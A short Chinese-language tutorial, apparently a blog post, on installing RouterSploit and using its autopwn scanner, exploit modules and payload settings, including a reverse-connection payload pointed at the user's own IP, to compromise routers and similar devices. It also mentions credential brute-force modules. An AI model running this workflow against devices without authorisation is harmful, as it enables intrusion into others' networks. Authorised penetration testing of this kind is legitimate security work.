什么是RouterSploit？
RouterSploit是一个用Python写的框架，可以自动完成与路由器相关的大多数漏洞利用任务。它以Metasploit为模型，任何习惯Metasploit框架的人都会熟悉它的命令。它包含扫描和利用模块，可用于Kali Linux安装下载与目标网络联网后，扫描后将显示是否可以通过框架轻松利用路由器，我将通过Autopwn功能快速识别路由器和连接设备上的漏洞。RouterSploit。它包含了27个品牌的上百种漏洞利用模块，涉及的路由器、摄像头，交换机等设备有几百种。渗透的时候，用户首先根据目标设备的品牌选择对应的扫描模块，用以发现漏洞。一旦漏洞识别，就可以根据提示使用对应的漏洞利用模块，即可进行渗透攻击。同时，该工具还提供授权认证爆破模块，用以破解设备常见服务的用户名和密码。

https://github.com/reverse-shell/routersploit

安装利用RouterSploit

sudo apt-get install python-dev python-pip libncurses5-dev git

git clone https://github.com/reverse-shell/routersploit

cd routersploit

apt install python3-pip

pip3 install -r requirements.txt

python3 rsf.py



选择 autopwn模块，可以自动检查适合我们设置的目标的任何漏洞

use scanners/autopwn

set target 192.168.0.1  //设置扫描的网关路由

run 开始扫描漏洞





这里介绍一些[+][-][*]代表的意思

[+]存在漏洞

[-]漏洞不存在

[*]无法确定

扫描完就直接显示出来



选择好exp检测是否可利用

use [exp]

check



接着配置payload

run

show payloads

set payload [设置payload正或反向连接]

show options 查看配置

set lhost [你的ip]

run //开始攻击



进源渗透，路由器的安全是很容易被忽略掉的，大部分的人不会去主动的去更新路由器的固件所以基本RouterSploit多少会扫出来一些洞
https://www.modb.pro/db/144489

参考：

https://www.oschina.net/p/routersploit?hmsr=aladdin1e1

https://blog.csdn.net/yalecaltech/article/details/104537355